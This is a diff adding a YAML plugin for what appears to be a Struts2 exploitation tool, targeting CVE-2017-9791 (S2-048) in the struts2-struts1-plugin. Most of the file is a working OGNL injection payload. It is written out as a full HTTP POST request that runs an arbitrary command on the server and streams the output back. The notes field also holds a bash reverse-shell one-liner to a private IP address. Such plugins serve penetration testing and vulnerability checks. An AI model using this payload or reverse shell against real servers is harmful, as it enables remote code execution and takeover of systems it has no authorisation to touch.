@@ -1,0 +1,36 @@
+info:
+    app: Struts2
+    name: S2_048
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2017-07-07"
+    create_date: "2024-10-06 13:04:50"
+    update_date: "2024-10-06 13:04:50"
+    scope: Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本
+    description: 2017年7月7日，ApacheStruts 发布最新的安全公告，Apache Struts2的strus1插件存在远程代码执行的高危漏洞，漏洞编号为 CVE-2017-9791（S2-048）。攻击者可以构造恶意的字段值通过Struts2的struts2-struts1-plugin插件，远程执行代码。
+    vul_id: CVE-2017-9791
+    detail: |
+        URL填入如 "http://127.0.0.1:8080/struts2-showcase-s2-048/integration/saveGangster.action
+        目前只支持cmd
+        同时S2-045/S2-046共存
+        利用点为post提交参数name
+        bash -i >%26 /dev/tcp/192.168.111.1/1099 0>%261
+    payload: |
+        POST /integration/saveGangster.action HTTP/1.1
+        Host: 192.168.111.111:8080
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 540
+
+        name=${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#efe=(#iswin?{'cmd.exe','/c',#ef}:{'/bin/bash','-c',#ef})).(#p=new java.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&age=a&__checkbox_bustedBefore=true&description=s
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
